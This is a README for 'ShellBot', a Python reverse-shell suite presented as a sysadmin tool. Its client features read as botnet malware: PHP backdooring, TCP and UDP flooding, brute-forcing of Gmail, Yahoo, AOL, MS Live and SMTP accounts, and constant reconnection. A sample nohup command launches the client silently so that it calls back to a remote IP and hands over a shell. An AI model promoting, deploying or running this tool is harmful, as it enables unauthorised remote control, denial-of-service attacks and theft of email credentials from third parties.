# ShellBot

[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot?ref=badge_shield)

##### An advanced reverse shell written in Python3.

---

ShellBot is a cross-platform Remote Shell Suite where the Server can be managed
by 1 Controller at a time.

A server can accept several clients at once, and relay a chosen client's shell
to the controller.

This makes it easy for an SysAdmin to manage several computers with minimal
setup in an internal network.

The ShellBot suite is designed in such a way that it will not stop till a
connection is achieved. All errors are handled internally and in case of a
crash, the program automatically restarts.

---

#### Features:

##### Server:

1. Can handle multiple connections all at once.
1. The Controller’s connection requires a plain text password, it’s not the best
   security, but at-least it is better than nothing. Will be improved on in
   future revisions.
1. Kicks the Controller after 5 mins. (As the Server only accepts 1 controller
   at a time). _TODO: Make it 5 minutes after inactivity._

##### Client:

1. Infected PHP Backdooring Function. *(Linux Only)*
1. TCP Flood.
1. UDP Flood.
1. Gmail Bruteforcer. (Workaround Gmail's SMTP login)
1. MS Live Bruteforcer.
1. Yahoo Bruteforcer.
1. AOL Bruteforce.
1. Custome SMTP Bruteforcer. If found, the password will be saved as
   "password.txt" on the client.
1. OTA Updating.
1. Hardened Shell: Handles No Output, Wrong, Interactive and Infinite commands
   will result in losing the shell.
1. Can handle multiple commands separated by semi-colon (;).
1. Never closes and is always trying to connect to the Server.
1. Can handle almost any non-interactive command properly.
1. Uses very less resources.
1. Can be packaged into executables with tools like pyInstaller.

##### Controller:

1. Handles `KeyboardInterrupts`, empty commands, etc. perfectly.
1. Easy user interface.

**Note:** When trying to start the client through SSH, Terminal or any other
interactive shell, it is advised to start the client in another process. This
can be done in Linux with `nohup`.

###### Example:

```sh
nohup python3 client.py 15.48.158.15 1567 > /dev/null &

nohup python3 client.py 15.48.158.15 1567 > /dev/null 2>&1 &
```

## License

[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot?ref=badge_large)
